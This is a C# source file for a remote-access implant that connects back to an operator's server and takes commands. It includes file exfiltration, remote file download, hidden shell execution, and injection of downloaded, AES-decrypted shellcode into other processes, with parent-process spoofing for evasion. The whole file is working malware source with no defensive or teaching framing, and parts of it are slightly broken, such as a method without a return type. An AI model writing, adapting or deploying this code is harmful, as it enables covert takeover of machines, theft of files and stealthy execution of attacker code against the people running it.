


using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Sockets;
using System.Threading;


public class Win32
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFOEX
	{
		public STARTUPINFO StartupInfo;
		public IntPtr lpAttributeList;
	}
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFileAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int nLength;
		public IntPtr lpSecurityDescriptor;
		[MarshalAs (UnmanagedType.Bool)]
		public bool bInheritHandle;
	}
	[Flags]
	public enum ProcessAccessFlags : uint
	{
		All = 0x001F0FFF,
		Terminate = 0x00000001,
		CreateThread = 0x00000002,
		VirtualMemoryOperation = 0x00000008,
		VirtualMemoryRead = 0x00000010,
		VirtualMemoryWrite = 0x00000020,
		DuplicateHandle = 0x00000040,
		CreateProcess = 0x00000080,
		SetQuota = 0x00000100,
		SetInformation = 0x00000200,
		QueryInformation = 0x00000400,
		QueryLimitedInformation = 0x00001000,
		Synchronize = 0x00100000
	}
	[DllImport("kernel32")]
	public static extern bool FreeLibrary(IntPtr hModule);
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
	[DllImport("kernel32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
	[DllImport("kernel32.dll")]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	[DllImport("kernel32.dll")]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	 [DllImport("Kernel32")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // Variables
        public static int PROCESS_CREATE_THREAD = 0x0002;
        public static int PROCESS_QUERY_INFORMATION = 0x0400;
        public static int PROCESS_VM_OPERATION = 0x0008;
        public static int PROCESS_VM_WRITE = 0x0020;
        public static int PROCESS_VM_READ = 0x0010;
        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 PAGE_EXECUTE_READ = 0x20;
        public static UInt32 PAGE_READWRITE = 0x04;
        public static int SW_HIDE = 0;
}

public class Internals
{
	public static int pid = 0;
	public static String[] RecvCommand(Stream stream)
	{

		// buffer to store the command response from the server
		byte[] command_response_bytes = new Byte[256];
		// String to store the command response ASCII representation
		String command_response_ascii = String.Empty;
		// Read the first batch of the server response bytes
		Int32 bytes = stream.Read(command_response_bytes, 0, command_response_bytes.Length);
		command_response_ascii = Encoding.ASCII.GetString(command_response_bytes, 0, bytes);

		return command_response_ascii.Split(' ');

	}
	public static void SendCommandResult(Stream stream, String commandresult)
	{
		// Send the command result to the server
		Byte[] commandresult_bytes = Encoding.ASCII.GetBytes(commandresult);
		stream.Write(commandresult_bytes, 0, commandresult_bytes.Length);
		String dtgvfck = "dtgvfck";
		Byte[] DtGvFck = Encoding.ASCII.GetBytes(dtgvfck);
		stream.Write(DtGvFck, 0, DtGvFck.Length);

	}

	public static void CloseSession(TcpClient agent, Stream stream)
	{
		stream.Close();
		agent.Close();
	}
	public static String DownloadFile(String filepath)
	{
		if (File.Exists(filepath))
		{
			if (Path.GetExtension(filepath) == ".exe")
			{
				Byte[] filebytes = File.ReadAllBytes(filepath);
				String encodbytes = Convert.ToBase64String(filebytes);
				String result_to_send = encodbytes;
				return result_to_send;
			}
			else
			{
				String filecontent = File.ReadAllText(filepath);
				String encodecontent = Convert.ToBase64String(Encoding.UTF8.GetBytes(filecontent));
				String result_to_send = encodecontent;
				return result_to_send;
			}
		}
		else
		{
			String result_to_send = "[!] the file does not exist";
			return result_to_send;
		}
	}
	public static void UploadFile(String url, String dstfile )
	{
		WebClient myWebClient = new WebClient();
		myWebClient.DownloadFile(url,dstfile);
	}
	public static String ShellCommand(string cmd)
	{

		String commandresult = "";

		using (Process process = new Process())
        	{
            		process.StartInfo.FileName = "cmd.exe";
	    		process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
	    		process.StartInfo.Arguments = "/C " + cmd;
            		process.StartInfo.UseShellExecute = false;
            		process.StartInfo.RedirectStandardOutput = true;
            		process.Start();
            		StreamReader reader = process.StandardOutput;
            		commandresult = reader.ReadToEnd();
		        process.WaitForExit(0);
        	}
		return commandresult;
	}

	private static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
                byte[] decryptedBytes = null;
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                        using (RijndaelManaged AES = new RijndaelManaged())
                        {
                                AES.KeySize = 256;
                                AES.BlockSize = 128;

                                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                                AES.Key = key.GetBytes(AES.KeySize / 8);
                                AES.IV = key.GetBytes(AES.BlockSize / 8);

                                AES.Mode = CipherMode.CBC;

                                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                                {
                                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                                        cs.Close();
                                }
                                decryptedBytes = ms.ToArray();
                        }
                }

                return decryptedBytes;
        }

	private static byte[] Downloader(string shellcode_url)
	{
		WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64 blalalala)");
		byte[] shellcode = wc.DownloadData(shellcode_url);
		return shellcode;
	}
        private static int GetPid(string procName)
        {
                int remoteProcId = 0;
                Process[] procs = Process.GetProcesses();
                foreach (Process proc in procs)
                {
                        if (proc.ProcessName == procName)
                        {
                                remoteProcId = proc.Id;
                                break;
                        }
                }

                return remoteProcId;
        }
	private static void InjectShellCode(int remoteProcId, byte[] shellcode)
	{

		// Opens the target process
		IntPtr procHandle = Win32.OpenProcess(Win32.PROCESS_CREATE_THREAD | Win32.PROCESS_QUERY_INFORMATION | Win32.PROCESS_VM_OPERATION | Win32.PROCESS_VM_WRITE | Win32.PROCESS_VM_READ, false, remoteProcId);
		// Allocate memory with PAGE_READWRITE permissions
		IntPtr spaceAddr = Win32.VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
		// Write shellcode into memory
		Win32.WriteProcessMemory(procHandle, spaceAddr, shellcode, new IntPtr(shellcode.Length), 0);
		// Change memory permissions to PAGE_EXECUTE_READ
		uint oldProtect;
		Win32.VirtualProtectEx(procHandle, spaceAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);
		// Create a new thread to execute shellcode
		IntPtr threatH = Win32.CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
		return;
	}
	private static int SpoofParent(int parentProcessId, string binaryPath)
	{
		// STARTUPINFOEX members
		const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
		// STARTUPINFO members (dwFlags and wShowWindow)
		const int STARTF_USESTDHANDLES = 0x00000100;
		const int STARTF_USESHOWWINDOW = 0x00000001;
		const short SW_HIDE = 0x0000;
		// dwCreationFlags
		const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
		const uint CREATE_NO_WINDOW = 0x08000000;
		// Structs
		var pInfo = new Win32.PROCESS_INFORMATION();
		var siEx = new Win32.STARTUPINFOEX();
		// Vars
		IntPtr lpValueProc = IntPtr.Zero;
		IntPtr hSourceProcessHandle = IntPtr.Zero;
		var lpSize = IntPtr.Zero;
		// Initializes the specified list of attributes for process and thread creation
		Win32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
		// Allocates memory from the unmanaged memory of the process.
		siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
		Win32.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);
		// Opens the parent process with CreateProcess and DuplicateHandle permissions
		IntPtr parentHandle = Win32.OpenProcess(Win32.ProcessAccessFlags.CreateProcess | Win32.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
		// Allocates memory from the unmanaged memory of the process
		lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
		// Writes the parentHandle address into lpValueProc
		Marshal.WriteIntPtr(lpValueProc, parentHandle);
		// Updates the StartUpInfo lpAttributeList PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
		// With the value of the Parent Process to spoof (lpValueProc)
		Win32.UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
		// StartupInformation flags
		siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		siEx.StartupInfo.wShowWindow = SW_HIDE;
		// Create new Process and Thread security Attributes
		var ps = new Win32.SECURITY_ATTRIBUTES();
		var ts = new Win32.SECURITY_ATTRIBUTES();
		ps.nLength = Marshal.SizeOf(ps);
		ts.nLength = Marshal.SizeOf(ts);
		// Creates the process with modified STARTINFO
		bool ret = Win32.CreateProcess(binaryPath, null, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
		if (!ret) { return 0; }
		return pInfo.dwProcessId;
	}
	public static void PID_Inject(Stream stream, string parent_processname, string process_toinject, string shellcode_url, string thepassword)
	{
		int parent_processid = GetPid(parent_processname);
		if (parent_processid != 0)
		{
			try
			{
				byte[] shellcode = Downloader(shellcode_url);
				if (shellcode.Length > 0)
				{
					byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(thepassword));
					shellcode = AES_Decrypt(shellcode, password);
					try
					{
						int remote_processid = SpoofParent(parent_processid, process_toinject);
						pid = remote_processid;
						if (remote_processid != 0)
						{
							try
							{
								InjectShellCode(remote_processid, shellcode);

							}
							catch
							{
								SendCommandResult(stream, "[!!!] Something went wrong while trying to inject the shellcode");
							}
						}

					}
					catch
					{
						SendCommandResult(stream, String.Format("[!!!] Something went wrong while lunching {0} with PPID {1}", process_toinject, pid));

					}
				}
				else
				{
					SendCommandResult(stream, "[!!!] the shellcode did not download");

				}

			}
			catch
			{
				SendCommandResult(stream, "[!!!] Something went wrong while trying to download the shellcode. May be the shellcode file or the passwrod.");
			}
		}
		else
		{
			SendCommandResult(stream, "[!] the parent process you are trying to spoof does note running");
		}
	}
	public static void Inject(Stream stream, string shellcode_url, string process_toinject, string thepassword)
	{
		int process_toinject_pid = GetPid(process_toinject);
		if (process_toinject_pid != 0)
		{
			pid = process_toinject_pid;
			try
			{
				byte[] shellcode = Downloader(shellcode_url);
				if (shellcode.Length > 0)
				{
					byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(thepassword));
					shellcode = AES_Decrypt(shellcode, password);
					try
					{

								InjectShellCode(pid, shellcode);

					}
					catch
					{
						SendCommandResult(stream, String.Format("[!!!] Something went wrong while injecting into {0} with PPID {1}", process_toinject, pid));

					}
				}
				else
				{
					SendCommandResult(stream, "[!!!] the shellcode did not download");

				}

			}
			catch
			{
				SendCommandResult(stream, "[!!!] Something went wrong while trying to download the shellcode. May be the shellcode file or the passwrod.");
			}
		}
		else
		{
			SendCommandResult(stream, "[!] the process you are trying to inject into does not running");
		}

	}
}


public class Agent
{

	public static Session(String server, Int32 port)
	{
		TcpClient agent = new TcpClient(server, port);

		// Get a client stream for reading and writing
		Stream stream = agent.GetStream();

		while (true)
		{
			String commandresult = "";
			String[] command = Internals.RecvCommand(stream);
			if (command[0] == "exit")
			{
				break;
			}
			// DownloadFile
			else if (command.Length > 1 && command.Length < 3 && command[0] == "download")
			{
				commandresult = Internals.DownloadFile(command[1]);
			}
			// UploadFile
			else if (command.Length > 1 && command.Length < 4 && command[0] == "upload")
			{	try
				{
					Internals.UploadFile(command[1], command[2]);
					commandresult = "[+] Successfuly uploaded";

				}
				catch
				{
					commandresult = "[!] Something went wrong while uploading";
				}
			}
			// ShellCommand
			else if (command.Length > 0 && command[0] == "shell")
			{
				try
				{
					string cmd = "";
					for (int i=1; i<command.Length; i++)
					{
						cmd += (command[i]+ " ");
					}
					commandresult = Internals.ShellCommand(cmd);

				}
				catch
				{
					commandresult = "[!] Something while executing the command";
				}
			}
			else if (command.Length > 0 && command[0] == "pid_inject")
			{
				try
				{
					if (command[2].Contains("*"))
					{
						command[2] = command[2].Replace("*", " ");
						Console.WriteLine(command[2]);
					}
					Internals.PID_Inject(stream, command[1], command[2], command[3], command[4]);
					if (Internals.pid != 0)
					{
						commandresult = String.Format("[+] Successfuly Injected shellcode in PID: {0}", Internals.pid);
					}
					else
					{
						commandresult = String.Format("[!] may be the binary path is wrong: {0}", command[2] );
					}
				}
				catch
				{
					commandresult = "[!] Something wrong with this feature";
					commandresult = "[!] maybe the link you provided!";
				}

			}
			// Process Injection
			else if (command.Length > 1 && command[0] == "inject")
			{
				try
				{
					Internals.Inject(stream, command[1], command[2], command[3]);
					if (Internals.pid != 0)
					{
						commandresult = String.Format("[+] Successfuly Injected shellcode in PID: {0}", Internals.pid);
					}
					else
					{
						commandresult = String.Format("[!] may be {0} is not runnig", command[2]);
					}
				}
				catch
				{
					commandresult = "[!] Something wrong with this feature";
					commandresult = "[!] maybe the link you provided!";
				}

			}
			Internals.SendCommandResult(stream, commandresult);
		}
		Internals.CloseSession(agent, stream);
		Environment.Exit(0);

	}

	public static void Main(string[] args)
	{
		int x = 0;
		string ip = args[0];
		int port = Int32.Parse(args[1]);
		Session(ip, port);

	}

}



